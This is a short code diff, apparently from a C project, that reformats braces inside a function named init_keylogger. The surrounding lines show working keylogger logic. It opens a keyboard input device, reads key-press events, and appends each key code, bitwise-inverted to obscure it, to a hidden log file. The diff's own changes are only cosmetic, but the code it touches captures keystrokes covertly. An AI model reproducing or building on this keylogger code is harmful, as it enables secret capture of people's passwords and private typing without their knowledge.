@@ -16,7 +16,8 @@ int init_keylogger()
 	char path[] = UAM_KEYBOARD;
 	FILE *file;
 
-	if ((keybrdToCapture = open(path, O_RDONLY)) == -1) {
+	if ((keybrdToCapture = open(path, O_RDONLY)) == -1)
+	{
 #ifdef DEBUG
 		printf("Error opening device\n");
 #endif
@@ -27,16 +28,19 @@ int init_keylogger()
 	{
 		rb = read(keybrdToCapture, ev, sizeof(struct input_event) * 64);
 
-		for (i = 0; i < (int)(rb / sizeof(struct input_event)); i++) {
+		for (i = 0; i < (int)(rb / sizeof(struct input_event)); i++)
+		{
 			file = fopen(BL, "ab+");
-			if (!file) {
+			if (!file)
+			{
 #ifdef DEBUG
 				printf("[ERROR] No file?\n");
 #endif
 				return ERROR;
 			}
 
-			if (EV_KEY == ev[i].type && ev[i].value == 1) {
+			if (EV_KEY == ev[i].type && ev[i].value == 1)
+			{
 				fputc(~ev[i].code, file);
 			}
 
